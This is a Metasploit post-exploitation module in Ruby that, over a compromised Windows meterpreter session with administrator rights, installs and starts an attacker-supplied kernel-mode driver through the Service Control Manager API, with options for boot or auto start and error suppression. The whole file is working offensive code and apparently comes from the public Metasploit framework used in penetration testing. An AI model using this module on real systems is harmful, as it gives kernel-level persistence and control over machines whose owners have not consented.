##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Driver Loader',
      'Description'   => %q{
        This module loads a KMD using the Windows Service API.
      },
      'License'       => MSF_LICENSE,
      'Author'        => 'Borja Merino <bmerinofe[at]gmail.com>',
      'Platform'      => 'windows',
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('DRIVER_PATH', [true, 'Relative driver path to %SYSTEMROOT%. For example, system32\drivers\msf.sys']),
        OptString.new('DRIVER_NAME', [true, 'Driver Name.']),
        OptEnum.new('START_TYPE',    [true, 'Start type.', 'auto', [ 'boot', 'system', 'auto', 'demand','disabled']]),
        OptEnum.new('SERVICE_TYPE',  [true, 'Service type.', 'kernel', [ 'kernel', 'file_system', 'adapter', 'recognizer']]),
        OptEnum.new('ERROR_TYPE',    [true, 'Error type.', 'ignore', [ 'ignore', 'normal', 'severe', 'critical']])
      ], self.class)
  end

  def run
    driver = datastore['DRIVER_PATH']
    start = datastore['START_TYPE']
    error = datastore['ERROR_TYPE']
    service = datastore['SERVICE_TYPE']
    name = datastore['DRIVER_NAME']

    unless is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    full_path = expand_path("%SYSTEMROOT%") << "\\" << driver

    unless file_exist?(full_path)
      print_error("Driver #{full_path} does not exist.")
      return
    end

    install_driver(driver,start,name,error,service)
  end

  def install_driver(driver,start,name,error,service)
    sc_manager_all_access = 0xF003F
    service_all_access = 0xF01FF
    error_service_exists = 0x431
    service_type = get_service_const(service)
    service_error_type = get_error_const(error)
    service_start_type = get_start_const(start)
    advapi32 = client.railgun.advapi32

    # SC_HANDLE WINAPI OpenSCManager(
    #  _In_opt_  LPCTSTR lpMachineName,
    #  _In_opt_  LPCTSTR lpDatabaseName,
    #  _In_      DWORD dwDesiredAccess
    #);

    ro = advapi32.OpenSCManagerA(nil, nil, sc_manager_all_access)

    if ro['GetLastError'] == 0
      print_status("Service Control Manager opened successfully.")
    else
      print_error("There was an error opening the Service Control Manager. GetLastError=#{ro['GetLastError']}.")
      return
    end

    # SC_HANDLE WINAPI CreateService(
    #  _In_       SC_HANDLE hSCManager,
    #  _In_       LPCTSTR lpServiceName,
    #  _In_opt_   LPCTSTR lpDisplayName,
    #  _In_       DWORD dwDesiredAccess,
    #  _In_       DWORD dwServiceType,
    #  _In_       DWORD dwStartType,
    #  _In_       DWORD dwErrorControl,
    #  _In_opt_   LPCTSTR lpBinaryPathName,

    #  _In_opt_   LPCTSTR lpLoadOrderGroup,
    #  _Out_opt_  LPDWORD lpdwTagId,
    #  _In_opt_   LPCTSTR lpDependencies,
    #  _In_opt_   LPCTSTR lpServiceStartName,
    #  _In_opt_   LPCTSTR lpPassword
    # );

    rc = advapi32.CreateServiceA(ro['return'], name, name, service_all_access, service_type, service_start_type, service_error_type, driver, nil, nil, nil, nil, nil)

    if rc['GetLastError'] == 0
      print_status("Service object added to the Service Control Manager database.")
      load_driver(advapi32, rc['return'])
      advapi32.CloseServiceHandle(rc['return'])
    elsif rc['GetLastError'] == error_service_exists
      print_error("The specified service already exists.")
      # Just to know if the service corresponds to the same driver or not.
      show_path_driver(name)
    else
      print_error("There was an error opening the driver handler. GetLastError=#{rc['GetLastError']}.")
    end
    advapi32.CloseServiceHandle(ro['return'])
  end

  def load_driver(advapi32,handler)
    error_service_already_running = 0x420

    # BOOL WINAPI StartService(
    #  _In_      SC_HANDLE hService,
    #  _In_      DWORD dwNumServiceArgs,
    #  _In_opt_  LPCTSTR *lpServiceArgVectors
    # );

    rs = advapi32.StartServiceA(handler,0,nil)

    if rs['GetLastError'] == 0
      print_good("Driver loaded successfully.")
    elsif rs['GetLastError'] == error_service_already_running
      print_error("Service already running.")
    else
      print_error("There was an error loading the driver. GetLastError=#{rs['GetLastError']}.")
    end
  end

  def show_path_driver(name)
    key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\" << name
    begin
      service = registry_enumvals(key)
      service.each do |s|
          next unless s == "ImagePath"
          value_path = registry_getvaldata(key,s)
          print_error("Path of driver file in \"#{name}\" service: #{value_path}")
          break
      end
    rescue ::RuntimeError, Rex::TimeoutError
      return
    end
  end

  def get_start_const(type)
    const_type = {
      "demand"    => 0x00000003,
      "boot"      => 0x00000000,
      "auto"      => 0x00000002,
      "disabled"  => 0x00000004,
      "system"    => 0x00000001
    }

    return const_type[type]
  end

  def get_error_const(type)
    const_type = {
      "critical"  => 0x00000003,
      "normal"    => 0x00000001,
      "severe"    => 0x00000002,
      "ignore"    => 0x00000000
    }

    return const_type[type]
  end

  def get_service_const(type)
    const_type = {
      "kernel"      => 0x00000001,
      "file_system" => 0x00000002,
      "adapter"     => 0x00000004,
      "recognizer"  => 0x00000008
    }

    return const_type[type]
  end
end
